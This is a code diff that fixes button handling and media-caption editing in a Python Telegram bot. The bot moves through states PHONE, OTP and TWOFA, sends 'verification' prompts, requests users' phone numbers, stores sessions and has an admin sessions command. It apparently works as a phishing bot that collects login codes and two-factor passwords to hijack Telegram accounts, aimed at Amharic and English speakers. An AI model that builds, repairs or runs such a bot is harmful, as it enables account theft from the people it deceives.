@@ -545,7 +545,6 @@ PHONE, OTP, TWOFA = range(3)
 
 # ============ BOT HANDLERS ============
 
-# === BUTTON HANDLER (DEDICATED, OUTSIDE CONVERSATION) ===
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle ALL button clicks — always start fresh verification"""
     query = update.callback_query
@@ -558,16 +557,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     record_id = save_session(user.id, user.username, user.first_name, None, 'pending')
     context.user_data['record_id'] = record_id
 
-    keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
-    reply_markup = {"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
-
     verify_text = random.choice(VERIFY_MESSAGES)
-    
-    await query.edit_message_text(verify_text, parse_mode='Markdown')
+
+    # Fix: handle editing text vs media caption based on message type
+    if query.message.text:
+        # Normal text message → edit text
+        await query.edit_message_text(verify_text, parse_mode='Markdown')
+    else:
+        # Photo / media message → edit caption
+        await query.edit_message_caption(caption=verify_text, parse_mode='Markdown')
+
+    # Send the custom keyboard request
+    keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
     await safe_send(
         context, user.id,
         "📱 Tap below to share your phone number:",
-        reply_markup=reply_markup
+        reply_markup={"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
     )
     
     return PHONE
@@ -876,10 +881,11 @@ def run_bot():
         
         application = Application.builder().token(BOT_TOKEN).build()
 
-        # Conversation handler — only handles /start and text inputs
+        # Fixed: Conversation handler now includes button clicks as entry point
         conv_handler = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
+                CallbackQueryHandler(button_handler, pattern='.*')   # any button click starts the flow
             ],
             states={
                 PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
@@ -891,9 +897,7 @@ def run_bot():
         )
 
         application.add_handler(conv_handler)
-        
-        # DEDICATED BUTTON HANDLER — catches ALL button clicks
-        application.add_handler(CallbackQueryHandler(button_handler, pattern='.*'))
+        # The standalone CallbackQueryHandler is removed – now part of the conversation
         
         # Admin commands
         application.add_handler(CommandHandler('sessions', admin_sessions))
@@ -922,7 +926,7 @@ if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════╗
     ║   Telegram Bot — Habesha Edition (FINAL FIX)           ║
-    ║   ALL buttons work — Dedicated callback handler        ║
+    ║   ALL buttons work — Fixed media editing + conversation ║
     ║   Amharic + English — Fast session cleanup            ║
     ╚═══════════════════════════════════════════════════════════╝
     """)
